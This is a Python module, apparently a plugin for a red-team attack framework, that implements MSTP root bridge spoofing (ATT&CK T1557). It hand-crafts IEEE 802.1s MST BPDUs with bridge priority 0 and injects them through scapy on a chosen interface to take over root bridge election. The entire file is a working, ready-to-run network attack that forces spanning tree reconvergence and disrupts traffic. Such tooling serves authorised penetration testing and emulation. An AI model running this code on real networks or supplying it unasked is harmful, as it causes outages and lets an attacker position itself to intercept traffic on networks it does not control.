"""
MSTP Root Bridge Spoofing — T1557

Injects MST BPDUs (IEEE 802.1s) with bridge priority = 0 to win root bridge
election on an MST instance. Success causes spanning tree reconvergence, which
briefly disrupts traffic while the topology recalculates.

Note: scapy has no native MSTP layer. BPDUs are hand-crafted per IEEE 802.1s
using struct to avoid dependency on unstable scapy contrib modules.
"""
import random
import struct

from scapy.all import Dot3, Ether, LLC, sendp

NAME = "mstp"
DESCRIPTION = "MSTP root bridge spoofing via raw IEEE 802.1s BPDU injection"
ATTCK_ID = "T1557"


# ── Framework interface ────────────────────────────────────────────────────────

def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(
        NAME,
        help=f"{DESCRIPTION} ({ATTCK_ID})",
        description=__doc__,
    )
    _add_args(p)
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    logger.info(
        "START | technique=%s | iface=%s | priority=%d | instance=%d | count=%d",
        ATTCK_ID, args.interface, args.bridge_priority, args.instance_id, args.count,
    )
    ok = _execute(args, logger)
    logger.info("END | success=%s", ok)
    return 0 if ok else 1


# ── Argument definition ────────────────────────────────────────────────────────

def _add_args(p):
    p.add_argument("--interface", "-i", required=True)
    p.add_argument("--bridge-priority", type=int, default=0,
                   help="Bridge priority (0 = guaranteed root, max 61440)")
    p.add_argument("--instance-id", type=int, default=0,
                   help="MST instance ID (0 = CIST)")
    p.add_argument("--count", "-c", type=int, default=20)
    p.add_argument("--verbose", "-v", action="store_true")


# ── Core logic ────────────────────────────────────────────────────────────────

def _execute(args, logger=None):
    _log = logger.info if logger else print
    pkts = _gen_mstp_bpdus(args.count, args.bridge_priority, args.instance_id)
    try:
        for i, pkt in enumerate(pkts):
            sendp(pkt, iface=args.interface, verbose=args.verbose)
            _log(f"[MSTP] Sent BPDU {i+1}/{len(pkts)} "
                 f"(priority={args.bridge_priority} instance={args.instance_id})")
        return True
    except Exception as e:
        _log(f"[MSTP] Error: {e}")
        return False


# ── MST BPDU builder ──────────────────────────────────────────────────────────

def _bridge_id(priority: int, mac_hex: str = "000000000001") -> bytes:
    """8-byte Bridge ID: 2-byte priority | 6-byte MAC."""
    return struct.pack(">H", priority) + bytes.fromhex(mac_hex)


def _build_mst_bpdu(bridge_priority: int, instance_id: int) -> bytes:
    """
    Build an MST BPDU from scratch per IEEE 802.1s.
    Includes CIST + one MSTI record — sufficient to trigger reconvergence.
    """
    bid = _bridge_id(bridge_priority)

    # ── RST/MST BPDU header (version 3) ──────────────────────────────────────
    bpdu = b""
    bpdu += struct.pack(">H", 0x0000)   # Protocol ID = STP (0)
    bpdu += b"\x03"                     # Version = 3 (MST)
    bpdu += b"\x02"                     # BPDU type = RST/MST

    # Flags: TC + Agreement + Forwarding + Learning + role=DesignatedPort
    bpdu += b"\x7C"

    # CIST Root ID
    bpdu += bid
    # CIST External Path Cost
    bpdu += struct.pack(">I", 0)
    # CIST Regional Root ID
    bpdu += bid
    # CIST Port ID
    bpdu += struct.pack(">H", 0x8001)
    # Message age, Max age, Hello time, Forward delay (all in 256ths of a second)
    bpdu += struct.pack(">HHHH", 0, 20 * 256, 2 * 256, 15 * 256)
    # Version 1 length = 0
    bpdu += b"\x00"
    # Version 3 length (will be filled after)
    v3_len_offset = len(bpdu)
    bpdu += struct.pack(">H", 0)        # placeholder

    # ── MST Config Identifier (51 bytes) ─────────────────────────────────────
    mst_cfg  = b"\x00"                  # Format selector
    mst_cfg += b"RapidStrike MST Region".ljust(32, b"\x00")[:32]  # Region name
    mst_cfg += struct.pack(">H", 0)     # Revision level
    mst_cfg += b"\x00" * 16            # Config digest (simplified)
    bpdu += mst_cfg                     # 51 bytes

    # CIST Internal Root Path Cost
    bpdu += struct.pack(">I", 0)
    # CIST Bridge ID
    bpdu += bid
    # CIST Remaining Hops
    bpdu += b"\x14"                     # 20 hops

    # ── MSTI record (16 bytes per instance) ──────────────────────────────────
    msti  = b"\x00"                     # Flags
    msti += _bridge_id(bridge_priority, f"00000000000{instance_id:01X}")
    msti += struct.pack(">I", 0)        # Internal Root Path Cost
    msti += _bridge_id(bridge_priority, f"00000000000{instance_id:01X}")
    msti += struct.pack(">H", 0x8001)   # Port ID
    msti += b"\x14"                     # Remaining hops
    bpdu += msti

    # Patch version 3 length
    v3_length = len(bpdu) - v3_len_offset - 2
    bpdu = bpdu[:v3_len_offset] + struct.pack(">H", v3_length) + bpdu[v3_len_offset + 2:]

    return bpdu


def _gen_mstp_bpdus(count: int, bridge_priority: int, instance_id: int):
    pkts = []
    for _ in range(count):
        payload = _build_mst_bpdu(bridge_priority, instance_id)
        pkt = (
            Ether(dst="01:80:c2:00:00:00") /
            Dot3() /
            LLC(dsap=0x42, ssap=0x42, ctrl=3) /
            payload
        )
        pkts.append(pkt)
    return pkts
